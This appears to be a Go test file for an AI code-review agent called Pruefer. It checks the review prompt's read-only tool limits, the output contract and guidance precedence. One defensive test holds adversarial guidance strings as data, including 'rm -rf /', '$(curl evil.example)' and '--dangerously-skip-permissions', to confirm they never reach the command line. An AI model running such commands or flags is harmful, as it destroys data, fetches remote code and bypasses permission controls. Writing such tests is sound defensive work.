	}
}

// TestBuildReviewPrompt_ContainsSummaryDelimiterMarkers pins #1456's R1: the
// output contract must instruct Claude to wrap its prose summary in the
// literal PRUEFER_SUMMARY_BEGIN/END marker strings, so a future edit to the
// prompt can't silently drop the contract findings.go's parser depends on.
func TestBuildReviewPrompt_ContainsSummaryDelimiterMarkers(t *testing.T) {
	prompt := buildReviewPrompt(ReviewRequest{})
	for _, want := range []string{"PRUEFER_SUMMARY_BEGIN", "PRUEFER_SUMMARY_END"} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected marker %q in prompt, got:\n%s", want, prompt)
		}
	}
}

// TestBuildReviewPrompt_NoOmittedPaths_NoSection pins the additive-only
// contract of renderOmittedPaths (#1462 R4): a request with nothing omitted
// must not add the section at all.
func TestBuildReviewPrompt_NoOmittedPaths_NoSection(t *testing.T) {
	prompt := buildReviewPrompt(ReviewRequest{})
	if strings.Contains(prompt, "Files omitted from this review") {
		t.Error("expected no omitted-files section when nothing was omitted")
	}
}

// TestBuildReviewPrompt_OmittedExcludedPaths_Named pins R4: an excluded path
// is named in the prompt, tagged as excluded_paths, and the reviewer is told
// not to read it. The old `git diff ... ':!path'` example is gone (#2192): git
// is not available to the reviewer and the clone has no base ref.
func TestBuildReviewPrompt_OmittedExcludedPaths_Named(t *testing.T) {
	req := ReviewRequest{BaseBranch: "main", OmittedExcludedPaths: []string{"data/corpus.jsonl"}}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "Files omitted from this review") {
		t.Fatalf("expected the omitted-files section, got:\n%s", prompt)
	}
	if !strings.Contains(prompt, "data/corpus.jsonl (excluded by `excluded_paths`)") {
		t.Errorf("expected data/corpus.jsonl labeled as excluded_paths, got:\n%s", prompt)
	}
	if !strings.Contains(prompt, "do not read them from the working tree") {
		t.Errorf("expected an instruction not to read omitted files, got:\n%s", prompt)
	}
	if strings.Contains(prompt, ":!") || strings.Contains(prompt, "git diff main...HEAD") {
		t.Errorf("the unusable git pathspec example must be gone, got:\n%s", prompt)
	}
}

// TestBuildReviewPrompt_OmittedTrimmedPaths_NamedDistinctlyFromExcluded pins
// R4: a trimmed-for-size file is disclosed with a distinct reason from an
// excluded_paths match, so a human (or the model) can tell "operator
// configured this out" from "the size guard dropped it" apart.
func TestBuildReviewPrompt_OmittedTrimmedPaths_NamedDistinctlyFromExcluded(t *testing.T) {
	req := ReviewRequest{OmittedTrimmedPaths: []string{"pkg/generated.go"}}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "pkg/generated.go (dropped to fit within max_diff_bytes)") {
		t.Errorf("expected pkg/generated.go labeled as trimmed-for-size, got:\n%s", prompt)
	}
	if strings.Contains(prompt, "pkg/generated.go (excluded by") {
		t.Error("a trimmed file must not be mislabeled as excluded_paths")
	}
}

// NOTE (#1446 -> guidance expansion): this golden was originally #1446's
// proof that splitting buildReviewPrompt into layers changed nothing. It did
// its job. The guidance text has since been deliberately expanded, so the
// golden is re-anchored to the new output and the test's role changes from
// "the refactor changed nothing" to "no one changes the zero-config prompt
// without noticing". Everything outside the guidance paragraph — dynamic
// context and the Go-owned output contract — is unchanged byte-for-byte.
//
// TestBuildReviewPrompt_ZeroConfig_ByteIdenticalToPreSplitOutput pins AC1/C2:
// buildReviewPrompt(ReviewRequest{}) — the zero-config case — must produce
// exactly the same prompt the pre-#1446 monolithic function produced,
// byte-for-byte. This literal was captured from buildReviewPrompt before
// the dynamic-context/guidance/contract split, and confirmed (by checking
// out the pre-split commit into a scratch worktree and running the
// identical capture there) to be byte-identical to what the original,
// unsplit function actually produced — not hand-transcribed from reading
// the source. A regression that dropped, reordered, or reworded any part
// of the prompt during the split would fail this comparison.
func TestBuildReviewPrompt_ZeroConfig_ByteIdenticalToPreSplitOutput(t *testing.T) {
	// wantContract is the pre-#2306 output contract, captured before the default
	// guidance became a skill (R4): it must stay byte-identical.
	const wantContract = "You do not decide whether this PR is approved or blocked — that is computed automatically from the severity you assign each finding below, never from anything you write in prose. Do not use approval/rejection language such as \"LGTM\" or \"requesting changes\" in your summary; just describe what you found.\n\nOutput has two parts, in this exact order:\n\n1. A short prose summary: what you reviewed and your overall assessment. This is the only text GitHub shows outside of inline comments, so it must stand on its own. Wrap it in PRUEFER_SUMMARY_BEGIN and PRUEFER_SUMMARY_END marker lines, each alone on its own line, with nothing else on those lines. Nothing — no narration, no meta-commentary, no investigation notes — may appear before PRUEFER_SUMMARY_BEGIN; anything there is discarded and never shown to anyone. The ```json findings block described in part 2 below must come after PRUEFER_SUMMARY_END, never between the two markers. For example:\n\nPRUEFER_SUMMARY_BEGIN\nReviewed the changes to X. Found one medium-severity issue; see inline comment.\nPRUEFER_SUMMARY_END\n\n2. A single fenced ```json code block containing a JSON array of your findings, each anchored to the exact file and line it concerns, with a \"severity\" classification:\n\n```json\n[{\"path\": \"engine/claude.go\", \"line\": 954, \"body\": \"...\", \"severity\": \"low\"}]\n```\n\n\"severity\" must be exactly one of:\n\n- \"low\": style, minor nit, or a suggestion — not a defect.\n- \"medium\": a real defect, but scoped and low-impact.\n- \"high\": a bug or design issue that will likely cause incorrect behavior.\n- \"critical\": a security vulnerability, data loss, or severe correctness bug.\n\nEach entry's \"path\" must be a file path exactly as it appears in the diff, and \"line\" must be a line number in the new (post-change) version of that file — i.e. a line you can see in `git diff` output prefixed with `+` or unprefixed (context), never a line that only existed in the old version. If you have no findings, emit an empty array `[]`. Do not put findings only in the prose — every specific, actionable finding belongs in the JSON array so it can be attached to its exact line; use the prose summary for overall assessment only. Report each distinct underlying finding once — if the same defect is visible at more than one line, pick the most relevant anchor rather than emitting a separate entry per line.\n\nOutput ONLY the review text itself: no preamble, no meta-commentary about what you are about to do.\n"
	const wantDynamic = "You are Pruefer, an automated code reviewer for pull request /#0: \"\".\n\nThe PR's head commit is already checked out in your working directory. You are a read-only reader and have exactly these tools; anything else is denied:\n\n- Read: read a file by absolute path. Use its offset and limit to page through a large file.\n- Grep and Glob: search file contents and file names.\n- Shell, only these read-only commands, one plain command at a time: `cat`, `head`, `tail`, `ls`. Pipes between them are fine; redirection, command substitution and chaining with `;`, `&&` or `||` are not.\n- Skill: invoke the review skill named below. It only loads instructions; it grants no other access.\n- Task: delegate part of a large diff (by file or area) to a subagent. Subagents are bound by exactly the same tools and path limits, and have no other tools. Only your own final message is the review, so merge their findings into it yourself.\n\nPath limits: Read, Grep, Glob and the shell commands reach only the working directory. Any other path, including `..` or symlinks that lead outside, is denied.\n\nNot available, so do not try them: find, wc, sed, rg, git of any kind, and any command that writes files, runs code (tests, builds, linters, package managers) or uses the network. You have no write access.\n\n"
	const wantSkill = "Carry out this review by invoking the `pruefer-review:review` skill with the Skill tool, before you read anything else. Its instructions are your review criteria: follow them for what to look for, how to verify and how to weigh findings. It does not define the output format; the output contract below does, and it applies to your final message.\n\n"
	got := buildReviewPrompt(ReviewRequest{})
	if want := wantDynamic + wantSkill + wantContract; got != want {
		t.Errorf("buildReviewPrompt(ReviewRequest{}) changed from the golden output:\ngot:  %q\nwant: %q", got, want)
	}
	// R4 for every guidance combination: the contract is the same tail.
	for _, req := range []ReviewRequest{
		{OperatorGuidance: "o"}, {RepoGuidance: "r", RepoGuidanceMode: GuidanceModeReplace},
		{OperatorGuidance: "o", OperatorGuidanceMode: GuidanceModeReplace, RepoGuidance: "r"},
	} {
		if p := buildReviewPrompt(req); !strings.HasSuffix(p, wantContract) {
			t.Errorf("contract changed for %+v", req)
		}
	}
}

// TestResolveGuidance_OperatorAppend_KeepsSkillAndAddsOperatorText pins
// AC3 under #2306: the default is the skill, so append mode keeps invoking it
// and passes the operator's text as additional guidance.
func TestResolveGuidance_OperatorAppend_KeepsSkillAndAddsOperatorText(t *testing.T) {
	req := ReviewRequest{OperatorGuidance: "Always check error wrapping uses %w."}
	got, replaces := resolveGuidance(req)
	if got != "Always check error wrapping uses %w." || replaces {
		t.Errorf("resolveGuidance = (%q, %v), want the operator text and replaces=false", got, replaces)
	}
	prompt := buildReviewPrompt(req)
	for _, want := range []string{"invoking the `pruefer-review:review` skill", "## Additional review guidance", "Always check error wrapping uses %w."} {
		if !strings.Contains(prompt, want) {
			t.Errorf("prompt missing %q, got:\n%s", want, prompt)
		}
	}
	if strings.Contains(prompt, "replaces the skill's") {
		t.Error("append mode must not say the guidance replaces the skill")
	}
}

// TestResolveGuidance_RepoAppend_KeepsSkillAndAddsRepoText mirrors the above
// for the repo layer.
func TestResolveGuidance_RepoAppend_KeepsSkillAndAddsRepoText(t *testing.T) {
	req := ReviewRequest{RepoGuidance: "Prefer table-driven tests."}
	got, replaces := resolveGuidance(req)
	if got != "Prefer table-driven tests." || replaces {
		t.Errorf("resolveGuidance = (%q, %v), want the repo text and replaces=false", got, replaces)
	}
	prompt := buildReviewPrompt(req)
	if !strings.Contains(prompt, "invoking the `pruefer-review:review` skill") || !strings.Contains(prompt, "Prefer table-driven tests.") {
		t.Errorf("prompt lost the skill or the repo guidance, got:\n%s", prompt)
	}
}

// TestBuildReviewPrompt_RepoReplace_DropsDefaultGuidanceKeepsContractAndContext
// pins AC4/C5/C7: mode: replace on the repo layer omits the default
// guidance text, but the output contract, the no-approval-language rule,
// and Go-supplied dynamic context (PR body, base branch, prior review
// threads) are all still emitted verbatim.
func TestBuildReviewPrompt_RepoReplace_DropsDefaultGuidanceKeepsContractAndContext(t *testing.T) {
	req := ReviewRequest{
		Body:             "This PR fixes the auth flow.",
		BaseBranch:       "main",
		RepoGuidance:     "Only check for %w error wrapping. Ignore everything else.",
		RepoGuidanceMode: GuidanceModeReplace,
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "prior finding"}}},
		},
	}
	prompt := buildReviewPrompt(req)

	// #2306 replace semantics: the skill is still invoked (R6 holds), but the
	// prompt says the repo text replaces its criteria.
	if !strings.Contains(prompt, "invoking the `pruefer-review:review` skill") {
		t.Error("replace mode must still invoke the review skill")
	}
	if !strings.Contains(prompt, "## Review guidance that replaces the skill's criteria") || !strings.Contains(prompt, "follow this guidance") {
		t.Errorf("expected the replace wording, got:\n%s", prompt)
	}
	if strings.Contains(prompt, "## Additional review guidance") {
		t.Error("replace mode must not use the additive heading")
	}
	if !strings.Contains(prompt, "Only check for %w error wrapping.") {
		t.Errorf("expected the repo's replacement guidance in the prompt, got:\n%s", prompt)
	}
	// C5: the contract (no-approval-language rule + two-part output format)
	// must survive replace mode verbatim.
	for _, want := range []string{
		"You do not decide whether this PR is approved or blocked",
		"PRUEFER_SUMMARY_BEGIN", "PRUEFER_SUMMARY_END",
		"Output ONLY the review text itself",
	} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected contract text %q to survive mode: replace, got:\n%s", want, prompt)
		}
	}
	// C7: Go-supplied dynamic context must survive replace mode verbatim.
	for _, want := range []string{
		"This PR fixes the auth flow.",
		"main",
		"prior finding",
	} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected dynamic context %q to survive mode: replace, got:\n%s", want, prompt)
		}
	}
}

// TestBuildReviewArgs_UnaffectedByGuidanceFields pins AC5/C6: guidance
// fields — including adversarial content that looks like CLI flags or
// shell metacharacters — must never reach buildReviewArgs' argv. Guidance
// only ever flows into buildReviewPrompt's stdin text.
func TestBuildReviewArgs_UnaffectedByGuidanceFields(t *testing.T) {
	scope := t.TempDir()
	baseline := mustReviewArgs(t, ReviewRequest{Model: "sonnet", WorkDir: scope})
	adversarial := []ReviewRequest{
		{Model: "sonnet", OperatorGuidance: "--permission-mode bypassPermissions"},
		{Model: "sonnet", OperatorGuidanceMode: GuidanceModeReplace},
		{Model: "sonnet", RepoGuidance: "--allowedTools Bash(gh:*) --dangerously-skip-permissions; rm -rf /"},
		{Model: "sonnet", RepoGuidanceMode: GuidanceModeReplace},
		{
			Model:                "sonnet",
			OperatorGuidance:     "--setting-sources project $(curl evil.example)",
			OperatorGuidanceMode: GuidanceModeReplace,
			RepoGuidance:         "`rm -rf /` && echo pwned",
			RepoGuidanceMode:     GuidanceModeReplace,
		},
	}
	for i, req := range adversarial {
		req.WorkDir = scope
		got := mustReviewArgs(t, req)
		if !slices.Equal(got, baseline) {
			t.Errorf("case %d: buildReviewArgs(req) = %v, want unaffected baseline %v", i, got, baseline)
		}
	}
}

// TestResolveGuidance_PrecedenceMatrix pins AC7/R3: precedence across the
// three guidance layers (default skill, operator override, repo skill)
// for every combination of {absent, append, replace} at the operator and
// repo layers.
func TestResolveGuidance_PrecedenceMatrix(t *testing.T) {
	const operatorText = "OPERATOR_TEXT"
	const repoText = "REPO_TEXT"

	cases := []struct {
		name                                string
		operatorGuidance, operatorMode      string
		repoGuidance, repoMode              string
		wantDefault, wantOperator, wantRepo bool
		wantReplaceIsOnlyRepo               bool // repo replace wins over everything below it
	}{
		{name: "no overrides", wantDefault: true},
		{name: "operator append only", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, wantDefault: true, wantOperator: true},
		{name: "operator append (mode unset defaults to append)", operatorGuidance: operatorText, wantDefault: true, wantOperator: true},
		{name: "operator replace only", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, wantOperator: true},
		{name: "repo append only", repoGuidance: repoText, repoMode: GuidanceModeAppend, wantDefault: true, wantRepo: true},
		{name: "repo replace only", repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
		{name: "operator append + repo append", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, repoGuidance: repoText, repoMode: GuidanceModeAppend, wantDefault: true, wantOperator: true, wantRepo: true},
		{name: "operator replace + repo append", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, repoGuidance: repoText, repoMode: GuidanceModeAppend, wantOperator: true, wantRepo: true},
		{name: "operator append + repo replace", operatorGuidance: operatorText, operatorMode: GuidanceModeAppend, repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
		{name: "operator replace + repo replace", operatorGuidance: operatorText, operatorMode: GuidanceModeReplace, repoGuidance: repoText, repoMode: GuidanceModeReplace, wantRepo: true, wantReplaceIsOnlyRepo: true},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			req := ReviewRequest{
				OperatorGuidance: c.operatorGuidance, OperatorGuidanceMode: c.operatorMode,
				RepoGuidance: c.repoGuidance, RepoGuidanceMode: c.repoMode,
			}
			got, replaces := resolveGuidance(req)

			if keepsDefault := !replaces; keepsDefault != c.wantDefault {
				t.Errorf("default skill criteria kept = %v, want %v; got:\n%s", keepsDefault, c.wantDefault, got)
			}
			if prompt := buildReviewPrompt(req); !strings.Contains(prompt, "invoking the `pruefer-review:review` skill") {
				t.Errorf("the skill is invoked in every layer combination, prompt:\n%s", prompt)
			}
			if hasOperator := strings.Contains(got, operatorText); hasOperator != c.wantOperator {
				t.Errorf("contains operator text = %v, want %v; got:\n%s", hasOperator, c.wantOperator, got)
			}
			if hasRepo := strings.Contains(got, repoText); hasRepo != c.wantRepo {
				t.Errorf("contains repo text = %v, want %v; got:\n%s", hasRepo, c.wantRepo, got)
			}
			if c.wantReplaceIsOnlyRepo && got != repoText {
				t.Errorf("resolveGuidance = %q, want exactly the repo's replacement text with nothing else", got)
			}
		})
	}
}

// TestReviewPrompt_OffersOnlyPermittedForms (#2192, R5): every command form the
// prompt offers inside backticks must be covered by the permission rules, and
// the denied families must be named only as unavailable.
func TestReviewPrompt_OffersOnlyPermittedForms(t *testing.T) {
	req := reviewTestScope(t)
	req.BaseBranch = "main"
	req.OmittedExcludedPaths = []string{"data/x.jsonl"}
	var b strings.Builder
	renderReviewTools(&b, req)
	section := b.String()
	prompt := buildReviewPrompt(req)

	known := []string{"cat", "head", "tail", "wc", "ls", "find", "sed", "rg", "git", "grep", "go", "cd", "awk", "curl"}
	for _, line := range strings.Split(section, "\n") {
		parts := strings.Split(line, "`")
		for i := 1; i < len(parts); i += 2 {
			first := strings.Fields(parts[i])
			if len(first) == 0 || !slices.Contains(known, first[0]) {
				continue
			}
			if !slices.Contains(reviewShellAllow, first[0]) {
				t.Errorf("prompt offers `%s` but the permission rules do not allow %q", parts[i], first[0])
			}
		}
	}
	for _, c := range reviewShellAllow {
		if !strings.Contains(section, "`"+c+"`") {
			t.Errorf("prompt does not name the permitted command %q", c)
		}
	}
	for _, tool := range []string{"Read", "Grep and Glob", "Task"} {
		if !strings.Contains(section, tool) {
			t.Errorf("prompt does not name %q", tool)
		}
	}
	// No suggestion anywhere outside the contract of a denied git/find/sed form.
	for _, bad := range []string{"git diff main...HEAD", "':!", "`find", "`sed", "`git ", "`rg"} {
		if strings.Contains(strings.Split(prompt, "Carry out this review")[0], bad) {
			t.Errorf("dynamic context suggests a denied form %q", bad)
		}
	}
	if !strings.Contains(section, "staged diff directory") {
		t.Errorf("path limits do not mention the staged diff directory")
	}
}

// stagedAt returns a StagedDiff naming dir, or nil for the empty string.
func stagedAt(dir string) *StagedDiff {
	if dir == "" {
		return nil
	}
	return &StagedDiff{Dir: dir}
}
